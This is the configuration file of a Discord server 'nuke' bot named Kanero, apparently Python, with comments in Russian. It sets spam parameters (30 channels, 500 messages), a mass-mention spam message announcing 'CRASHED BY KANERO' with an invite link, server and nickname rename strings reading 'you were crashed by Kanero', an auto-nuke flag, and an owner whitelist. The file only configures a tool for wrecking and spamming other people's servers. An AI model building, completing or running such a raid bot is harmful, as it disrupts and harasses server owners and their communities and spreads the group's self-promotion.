import os

# Токен читается из переменной окружения (безопасно для GitHub)
# Пробуем DISCORD_TOKEN, потом TOKEN, потом пустая строка
TOKEN = os.environ.get("DISCORD_TOKEN") or os.environ.get("TOKEN", "")
CHANNELS_COUNT = 30
SPAM_COUNT = 500
SPAM_TEXT = "|| @everyone  @here ||\n# CRASHED BY KANERO\n# Удачи гайс)\nХочешь так же? Заходи к нам!\n☠️ Kanero\nhttps://discord.gg/aud6wwYVRd\nDeveloper - DavaidKa ❤️"
GUILD_NAME = "Kanero"
GUILD_DESCRIPTION = "Вы были крашнуты By Kanero"
RENAME_TEXT = "Вы были крашнуты By Kanero"
NICK = "Вы были крашнуты By Kanero"
AUTO_NUKE = False

# Owner ID — читается из переменной окружения или используется значение по умолчанию
OWNER_ID = int(os.environ.get("OWNER_ID", "1421778029310509056"))

# Whitelist — сюда добавляй Discord ID пользователей
WHITELIST = [1421778029310509056]

# Owner whitelist — управляется только овнером через ЛС
OWNER_WHITELIST = [1421778029310509056]
